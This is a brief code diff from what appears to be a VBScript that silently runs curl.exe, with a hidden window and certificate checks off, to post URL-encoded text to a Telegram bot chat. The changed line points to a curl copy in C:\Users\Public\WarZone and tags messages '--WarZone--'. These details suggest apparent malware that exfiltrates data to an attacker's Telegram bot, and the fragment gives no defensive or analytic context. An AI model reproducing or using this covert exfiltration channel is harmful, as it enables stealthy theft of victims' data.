@@ -33,4 +33,4 @@ text = Replace(text, " ", "%20")
 text = Replace(text, "\n", "%0A")
 text = Replace(text, ":", "%3A")
 
-oShell.Run "curl.exe -k https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + text + "--WarZone--",0,True
+oShell.Run "C:\Users\Public\WarZone\curl.exe -k https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + text + "--WarZone--",0,True
